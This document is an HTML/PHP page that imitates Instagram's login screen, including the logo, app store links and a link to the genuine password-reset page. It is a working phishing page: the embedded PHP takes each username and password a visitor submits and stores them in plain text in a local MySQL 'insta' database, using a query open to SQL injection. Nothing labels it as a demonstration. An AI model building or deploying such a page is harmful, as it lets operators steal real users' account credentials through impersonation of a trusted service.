<!DOCTYPE html>
<html>

<head>
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="images/logo.webp" type="image/x-icon">
</head>

<body>
    <div class="container-1">
        <div class="logo">
            <img src="images/image.png" alt="Instagram Logo">
        </div>
        <form method="post">
            <input type="text" name="unm" placeholder="Phone number, username or email address" required>
            <input type="password" name="ps" placeholder="Password" required>
            <button type="submit" name="sb" class="login">Log in</button>
        </form>
        <div class="or">OR</div>
        <button class="facebook-login">
            <a href="fb.php"><img src="images/fblogo.jpeg" alt="fb img" height="15px">&nbsp; Log in with Facebook</a>
        </button>
        <div class="forgotten-password">
            <a href="https://www.instagram.com/accounts/password/reset/">Forgotten your password?</a>
        </div>
    </div>
    <div class="container-2">
        <div class="signup">
            Don't have an account? <a href="signup.php">Sign up</a>
        </div>
    </div>
    <div class="container-3">
        <div class="get-the-app">Get the app.</div>
        <div class="app-download">
            <a
                href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DA69A66AA-3A03-46E4-9BF0-0E2D3F65131C%26utm_campaign%3DunifiedHome%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge">
                <img src="images/phone img/GG.png" alt="Playstore">
            </a>
            <a href="https://apps.apple.com/us/app/instagram/id389801252?ct=igweb.unifiedHome.badge&mt=8&pt=428156&vt=lo"
                class="apple">
                <img src="images/phone img/Apstr.jpg" alt="Microsoft store">
            </a>
        </div>
    </div>
    
<?php
$server="localhost";
$username="root";
$password="";
$dbname="insta";

$con = mysqli_connect ($server , $username , $password , $dbname);
if(isset($_POST["sb"]))
{
    $uname=$_POST["unm"];
    $pass=$_POST["ps"];
    $query="insert into data (uname,pass) values ('$uname','$pass')";
    $run=mysqli_query($con,$query);
}
?>
</body>

</html>



